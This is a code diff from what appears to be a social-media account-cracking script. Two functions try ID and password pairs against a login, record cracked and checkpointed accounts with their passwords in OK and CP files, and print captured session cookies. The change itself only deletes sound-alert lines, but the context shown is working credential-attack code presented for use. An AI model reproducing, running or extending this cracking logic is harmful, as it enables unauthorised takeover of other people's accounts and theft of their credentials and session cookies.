@@ -591,7 +591,6 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}<•> {K}{idf}<•>{pw}\n{ua}{N}')     
 				open('CP/'+cpc,'a').write(idf+'<•>'+pw+'<•>'+ua+'\n')
-				os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -603,7 +602,6 @@ def crack(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print(f'\r{x}<•> {H}{idf}<•>{pw}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'<•>'+pw+'<•>'+ua+'\n')
-					os.popen('play-audio data/ok.mp3')
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
@@ -627,7 +625,6 @@ def crack(idf,pwv):
 						hit+=1
 						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
 					print(f'\r{x}——>SUCCESSFUL {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
-					os.popen('play-audio data/ok.mp3')
 					ok+=1
 					break
 
@@ -656,7 +653,6 @@ def crackfree(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				os.popen('play-audio .cp.mp3')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -683,7 +679,6 @@ def crackfree(idf,pwv):
 					hit+=1
 					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
 				print(f'\r{x}——>SUCCESSFUL {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
-				os.popen('play-audio .ok.mp3')
 				ok+=1
 				break
 
